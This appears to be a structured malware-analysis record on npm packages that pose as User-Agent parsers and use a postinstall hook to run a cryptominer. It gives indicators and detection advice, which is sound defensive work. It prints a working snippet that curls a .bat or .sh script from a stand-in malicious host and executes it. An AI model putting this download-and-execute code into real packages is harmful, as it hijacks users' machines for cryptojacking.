package_info.why_malicious: These packages masquerade as legitimate User-Agent header parsers but contain or depend on code that downloads and executes cryptocurrency mining software on the user's system, abusing system resources and potentially exposing users to further compromise.

execution_context.file_location: package scripts (likely postinstall in package.json or as a dependency)

malicious_snippets.code_snippet: if (process.platform === 'win32') { require('child_process').exec('curl http://malicious-host/miner.bat -o miner.bat && miner.bat'); } else { require('child_process').exec('curl http://malicious-host/miner.sh -o miner.sh && sh miner.sh'); }
malicious_snippets.code_behavior: During installation (postinstall), the code checks the platform and downloads a .bat or .sh script from an external host, then executes it, resulting in the download and execution of a cryptocurrency miner binary.

malice_analysis.why_suspicious: Downloading and executing remote scripts during installation is a classic malware technique, especially when the scripts are not part of the legitimate package functionality.
malice_analysis.violated_expectations: Legitimate User-Agent header parsers should not download or execute external binaries or scripts.
malice_analysis.similar_legitimate_use: Some legitimate packages may download platform-specific binaries for native modules, but these are typically from trusted sources and well-documented.
key_indicators: Downloads executable scripts from external, non-standard hosts
Behavior hidden under the guise of a utility library

malicious_snippets.code_behavior: At runtime, the downloaded script launches a cryptocurrency miner process, connecting to a mining pool with a specified wallet address and using multiple CPU threads.

malice_analysis.why_suspicious: Running a cryptocurrency miner without user consent is a clear abuse of system resources and is a hallmark of cryptojacking malware.
malice_analysis.violated_expectations: A JavaScript library should not install or run background processes, especially not cryptocurrency miners.
malice_analysis.similar_legitimate_use: Legitimate mining software may use similar commands, but only with explicit user consent and documentation.
key_indicators: Use of wallet addresses and thread configuration

attack_chain.action: Malicious package is installed, triggering postinstall script.
attack_chain.leads_to: Download and execution of platform-specific script.

attack_chain.action: Downloaded script retrieves and launches cryptocurrency miner binary.
attack_chain.leads_to: Miner runs in the background, connecting to mining pool and abusing system resources.

behavioral_signatures: Postinstall scripts that download and execute remote code
Execution of .bat or .sh scripts immediately after package installation
Silent background processes connecting to mining pools
file_indicators: suspicious scripts or binaries downloaded to temp or working directories
network_indicators: Outbound connections to known mining pool domains (e.g., stratum+tcp://miningpool.example.com)
HTTP requests to external hosts for script or binary download
detection_knowledge.how_to_detect: Monitor npm package installations for postinstall scripts that download and execute remote files. Flag packages that attempt to run .bat or .sh scripts or spawn background processes connecting to mining pools. Look for the presence of miner-related files and outbound connections to mining pool domains or suspicious external hosts.
